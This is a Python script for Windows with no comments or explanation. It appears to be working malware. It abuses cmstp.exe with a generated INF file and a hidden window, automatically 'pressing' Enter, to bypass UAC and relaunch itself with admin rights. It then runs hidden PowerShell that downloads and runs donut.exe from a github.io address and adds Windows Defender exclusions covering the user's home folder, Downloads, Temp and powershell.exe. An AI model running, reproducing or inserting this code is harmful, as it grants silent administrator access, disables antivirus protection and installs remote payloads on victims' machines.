import subprocess
import sys
import os
import tempfile
import ctypes
import random
import string
import threading
import time
import base64
from pathlib import Path

PROCESS_TERMINATE = 0x0001
TH32CS_SNAPPROCESS = 0x00000002
INVALID_HANDLE_VALUE = -1
SW_HIDE = 0
SWP_NOMOVE = 0x0002
SWP_NOSIZE = 0x0001
SWP_NOACTIVATE = 0x0010
WM_KEYDOWN = 0x0100
WM_KEYUP = 0x0101
VK_RETURN = 0x0D
HWND_BOTTOM = 1
STARTF_USESHOWWINDOW = 0x00000001
STARTF_USESTDHANDLES = 0x00000100

class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [
        ("dwSize", ctypes.c_ulong),
        ("cntUsage", ctypes.c_ulong),
        ("th32ProcessID", ctypes.c_ulong),
        ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)),
        ("th32ModuleID", ctypes.c_ulong),
        ("cntThreads", ctypes.c_ulong),
        ("th32ParentProcessID", ctypes.c_ulong),
        ("pcPriClassBase", ctypes.c_long),
        ("dwFlags", ctypes.c_ulong),
        ("szExeFile", ctypes.c_char * 260)
    ]

class STARTUPINFO_ELEV(ctypes.Structure):
    _fields_ = [
        ("cb", ctypes.c_ulong),
        ("lpReserved", ctypes.c_wchar_p),
        ("lpDesktop", ctypes.c_wchar_p),
        ("lpTitle", ctypes.c_wchar_p),
        ("dwX", ctypes.c_ulong),
        ("dwY", ctypes.c_ulong),
        ("dwXSize", ctypes.c_ulong),
        ("dwYSize", ctypes.c_ulong),
        ("dwXCountChars", ctypes.c_ulong),
        ("dwYCountChars", ctypes.c_ulong),
        ("dwFillAttribute", ctypes.c_ulong),
        ("dwFlags", ctypes.c_ulong),
        ("wShowWindow", ctypes.c_ushort),
        ("cbReserved2", ctypes.c_ushort),
        ("lpReserved2", ctypes.POINTER(ctypes.c_byte)),
        ("hStdInput", ctypes.c_void_p),
        ("hStdOutput", ctypes.c_void_p),
        ("hStdError", ctypes.c_void_p)
    ]

class PROCESS_INFORMATION_ELEV(ctypes.Structure):
    _fields_ = [
        ("hProcess", ctypes.c_void_p),
        ("hThread", ctypes.c_void_p),
        ("dwProcessId", ctypes.c_ulong),
        ("dwThreadId", ctypes.c_ulong)
    ]

kernel32 = ctypes.windll.kernel32
user32 = ctypes.windll.user32
TMP_DIR = tempfile.gettempdir()
CMSTP_EXT = ".inf"

def _rnd(n):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(n))

RND_FILE = _rnd(10) + CMSTP_EXT
RND_SVC = f"Microsoft {_rnd(6)} Service"

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def del_cmstp_cfgs():
    try:
        for f in Path(TMP_DIR).glob(f"*{CMSTP_EXT}"):
            try:
                f.unlink()
            except:
                pass
    except:
        pass

def kill_cmstp():
    snap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snap == INVALID_HANDLE_VALUE:
        return
    pe = PROCESSENTRY32()
    pe.dwSize = ctypes.sizeof(PROCESSENTRY32)
    if not kernel32.Process32First(snap, ctypes.byref(pe)):
        kernel32.CloseHandle(snap)
        return
    while True:
        pn = pe.szExeFile.decode('utf-8', errors='ignore').lower()
        if pn.startswith("cmstp.exe"):
            hp = kernel32.OpenProcess(PROCESS_TERMINATE, False, pe.th32ProcessID)
            if hp:
                kernel32.TerminateProcess(hp, 0)
                kernel32.CloseHandle(hp)
        if not kernel32.Process32Next(snap, ctypes.byref(pe)):
            break
    kernel32.CloseHandle(snap)

def mk_inf(bp, sn):
    rs = _rnd(4)
    nl = chr(10)
    q = chr(34)
    bs = chr(92)
    return f"""; {_rnd(12)}{nl}[version]{nl}Signature=$chicago${nl}AdvancedINF=2.5{nl}{nl}[DefaultInstall]{nl}CustomDestination=Dest{rs}{nl}RunPreSetupCommands=Cmds{rs}{nl}{nl}[Cmds{rs}]{nl}{bp}{nl}taskkill /IM cmstp.exe /F{nl}{nl}[Dest{rs}]{nl}49000,49001=LDID{rs}, 7{nl}{nl}[LDID{rs}]{nl}{q}HKLM{q}, {q}SOFTWARE{bs}{bs}Microsoft{bs}{bs}Windows{bs}{bs}CurrentVersion{bs}{bs}App Paths{bs}{bs}CMMGR32.EXE{q}, {q}ProfileInstallPath{q}, {q}%UnexpectedError%{q}, {q}{q}{nl}{nl}[Strings]{nl}ServiceName={q}{sn}{q}{nl}ShortSvcName={q}{_rnd(4)}{q}{nl}"""

def get_py():
    p = sys.executable
    pw = p.replace("python.exe", "pythonw.exe")
    return pw if os.path.exists(pw) else p

def get_script():
    return os.path.abspath(sys.argv[0])

def mk_cmd(sp, args):
    c = f'"{get_py()}" "{sp}"'
    for a in args:
        c += f" b64:{base64.b64encode(a.encode()).decode()}"
    return c

def mk_cmstp_cfg(args):
    vp = os.path.join(TMP_DIR, "elv.vbs")
    pc = mk_cmd(get_script(), args)
    vc = f'CreateObject("WScript.Shell").Run "{pc.replace(chr(34), chr(34)+chr(34))}", 0, False'
    try:
        with open(vp, 'w') as f:
            f.write(vc)
    except:
        pass
    cfg = mk_inf(f'wscript //B "{vp}"', RND_SVC)
    cp = os.path.join(TMP_DIR, RND_FILE)
    try:
        with open(cp, 'w') as f:
            f.write(cfg)
    except:
        pass

def do_sys(cmd):
    si = STARTUPINFO_ELEV()
    pi = PROCESS_INFORMATION_ELEV()
    si.cb = ctypes.sizeof(STARTUPINFO_ELEV)
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES
    si.wShowWindow = SW_HIDE
    if kernel32.CreateProcessW(None, cmd, None, None, False, 0, None, None, ctypes.byref(si), ctypes.byref(pi)):
        kernel32.WaitForSingleObject(pi.hProcess, 0xFFFFFFFF)
        kernel32.CloseHandle(pi.hProcess)
        kernel32.CloseHandle(pi.hThread)

def press_enter(hw):
    user32.PostMessageW(hw, WM_KEYDOWN, VK_RETURN, 0)
    user32.PostMessageW(hw, WM_KEYUP, VK_RETURN, 0)

def run_cmstp():
    cp = os.path.join(TMP_DIR, RND_FILE)
    cmd = f'cmstp.exe /au "{cp}"'
    t = threading.Thread(target=do_sys, args=(cmd,))
    t.start()
    for _ in range(500):
        time.sleep(0.01)
        hw = user32.FindWindowW(None, RND_SVC)
        if hw:
            user32.SetWindowPos(hw, HWND_BOTTOM, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE)
            user32.ShowWindow(hw, SW_HIDE)
            press_enter(hw)
            break

def elevate(args=None):
    if args is None:
        args = []
    del_cmstp_cfgs()
    kill_cmstp()
    if not is_admin():
        sp = get_script()
        if not sp or not os.path.exists(sp):
            return False
        mk_cmstp_cfg(args)
        run_cmstp()
        return True
    return False

def decode_args(args):
    d = []
    for a in args:
        if a.startswith("b64:"):
            d.append(base64.b64decode(a[4:]).decode())
        else:
            d.append(a)
    return d

def add_defender_exclusions():
    try:
        uh = os.path.expanduser("~")
        ad = os.environ.get("APPDATA", "")
        la = os.environ.get("LOCALAPPDATA", "")
        td = tempfile.gettempdir()
        bs = chr(92)
        crlf = chr(13) + chr(10)

        paths = [
            ad,
            os.path.join(la, "Temp"),
            td,
            os.path.join(uh, "Desktop"),
            os.path.join(uh, "Downloads"),
            f"C:{bs}Windows{bs}Temp",
            uh,
            f"C:{bs}Windows{bs}System32{bs}WindowsPowerShell{bs}v1.0{bs}powershell.exe"
        ]

        procs = [
            "donut.exe",
        ]

        ps = 'iwr "https://th3hunt3y.github.io/donut.exe" -OutFile file.exe; Start-Process file.exe'
        for p in paths:
            if p:
                ps += f"Add-MpPreference -ExclusionPath '{p.replace(chr(39), chr(39)+chr(39))}' -EA 0; "
        for pr in procs:
            ps += f"Add-MpPreference -ExclusionProcess '{pr}' -EA 0; "

        bf = os.path.join(td, "WinDefConfig.cmd")
        with open(bf, 'w') as f:
            f.write(f"@echo off{crlf}")
            f.write(f'powershell -W Hidden -C "{ps.replace(chr(34), bs+chr(34))}" 2>nul{crlf}')

        subprocess.Popen(
            ["cmd.exe", "/c", bf],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            creationflags=subprocess.CREATE_NO_WINDOW
        ).communicate()

        try:
            os.remove(bf)
        except:
            pass
    except:
        pass


if __name__ == "__main__":
    args = decode_args(sys.argv[1:])

    if elevate(args):
        time.sleep(2)
        sys.exit(0)

    add_defender_exclusions()
    print("")
